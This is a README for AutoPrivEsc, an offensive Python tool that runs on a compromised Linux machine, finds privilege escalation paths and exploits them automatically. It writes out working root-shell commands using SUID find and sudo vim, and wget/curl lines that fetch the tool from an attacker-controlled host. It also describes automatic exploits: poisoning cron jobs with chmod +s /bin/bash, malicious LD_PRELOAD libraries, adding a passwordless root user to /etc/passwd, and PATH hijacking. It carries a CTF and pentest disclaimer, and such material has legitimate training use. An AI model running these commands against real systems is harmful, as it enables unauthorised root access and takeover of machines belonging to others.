# ⚡ AutoPrivEsc — Linux Privilege Escalation Scanner & Auto-Exploiter

A Python tool that runs on a compromised Linux machine, automatically scans for privilege escalation vectors, and attempts to exploit each one — going all the way to root where possible.

> ⚠️ **For authorized use only.** CTF, lab, and pentest environments exclusively. Running this on systems you don't own is illegal.

---

## 🚀 What Makes This Different

Most tools (LinPEAS, LinEnum) **find** vulnerabilities and stop there.  
**AutoPrivEsc finds AND exploits** — it gives you the exact command to run, or executes the payload automatically.

| Tool | Finds vectors | Auto-exploits |
|---|---|---|
| LinPEAS | ✅ | ❌ |
| LinEnum | ✅ | ❌ |
| **AutoPrivEsc** | ✅ | ✅ |

---

## 🎯 Vectors Covered

| # | Vector | What It Checks | Auto-Exploit |
|---|---|---|---|
| 1 | **SUID Binaries** | Finds SUID binaries, checks against GTFOBins database (40+ binaries) | ✅ Prints exact GTFOBins command |
| 2 | **Sudo Misconfigs** | Parses `sudo -l` for NOPASSWD, dangerous binaries, wildcards | ✅ Runs matching GTFOBins sudo command |
| 3 | **Writable Cron Jobs** | Checks all cron paths + scripts called by cron for write access | ✅ Injects `chmod +s /bin/bash` payload |
| 4 | **LD_PRELOAD Abuse** | Detects `env_keep+=LD_PRELOAD` in sudo config | ✅ Compiles & loads malicious `.so` |
| 5 | **Writable /etc/passwd** | Checks if current user can write to `/etc/passwd` | ✅ Adds passwordless root user |
| 6 | **Capabilities** | Finds `cap_setuid`, `cap_setgid`, `cap_sys_admin` on binaries | ✅ Generates capability exploit command |
| 7 | **PATH Hijacking** | Finds writable `$PATH` dirs + SUID binaries calling relative commands | ✅ Plants fake binary |

---

## 🛠️ Installation

No external dependencies — pure Python 3 standard library.

```bash
git clone https://github.com/YOUR_USERNAME/autoprivesc-linux.git
cd autoprivesc-linux
```

Transfer to target machine:
```bash
# On attacker machine
python3 -m http.server 8000

# On target machine
wget http://<attacker-ip>:8000/autoprivesc.py
# or
curl http://<attacker-ip>:8000/autoprivesc.py -o autoprivesc.py
```

---

## ▶️ Usage

```bash
# Full scan + auto-exploit (default)
python3 autoprivesc.py

# Scan only — no exploitation
python3 autoprivesc.py --scan

# Save report to /tmp/
python3 autoprivesc.py --report
```

---

## 📸 Example Output

```
═══════════════════════════════════════════════════════
   AutoPrivEsc — Linux PrivEsc Scanner & Exploiter
═══════════════════════════════════════════════════════
  User  : www-data (uid=33)
  Mode  : SCAN + EXPLOIT
═══════════════════════════════════════════════════════

═══════════════════════════════════════════════════════
  VECTOR 1 — SUID Binaries
═══════════════════════════════════════════════════════
  [*] Searching for SUID binaries...
  [*] Found 12 SUID binary/binaries
  [FOUND] /usr/bin/find — exploitable via GTFOBins

  Exploit command:
  find . -exec /bin/bash -p \; -quit

═══════════════════════════════════════════════════════
  VECTOR 2 — Sudo Misconfigurations
═══════════════════════════════════════════════════════
  [FOUND] NOPASSWD sudo rule detected!
  [FOUND] Exploitable sudo binary: /usr/bin/vim

  Exploit command:
  sudo vim -c ':!/bin/bash'

═══════════════════════════════════════════════════════
  FINAL REPORT
═══════════════════════════════════════════════════════
  Vectors found:     3
  Exploits ready:    2
  Failed attempts:   0

  ✓ EXPLOIT COMMANDS TO RUN:

    [SUID]
    find . -exec /bin/bash -p \; -quit

    [SUDO_NOPASSWD]
    sudo vim -c ':!/bin/bash'
```

---

## 📁 File Structure

```
autoprivesc-linux/
├── autoprivesc.py    # Main scanner & exploiter
├── requirements.txt  # No external deps needed
└── README.md
```

---

## 📚 Key Concepts

**What is GTFOBins?**  
A curated list of Unix binaries that can be abused for privilege escalation, reverse shells, and file reads. AutoPrivEsc has 40+ GTFOBins commands hardcoded for both SUID and sudo contexts.

**What is LD_PRELOAD abuse?**  
If `sudo` is configured to preserve the `LD_PRELOAD` environment variable, any shared library listed there is loaded before any other. We compile a malicious `.so` that calls `setuid(0)` and spawns a root shell before the actual program even starts.

**What is PATH hijacking?**  
If a SUID binary calls another command without its full path (e.g. `service` instead of `/usr/sbin/service`), and we can write to a directory earlier in `$PATH`, we can plant a fake `service` binary that runs our payload with elevated privileges.

---

## 🔮 Possible Extensions

- [ ] Kernel exploit suggester (match uname -r against known exploits)
- [ ] NFS no_root_squash detection
- [ ] Docker/LXC container escape detection
- [ ] Weak file permissions on sensitive configs
- [ ] Automated reverse shell generation

---

## ⚠️ Disclaimer

This tool is for **educational and authorized use only** — CTF challenges, HackTheBox, TryHackMe, and authorized penetration tests.  
Do not run on systems you don't own.

---

## 📄 License

MIT
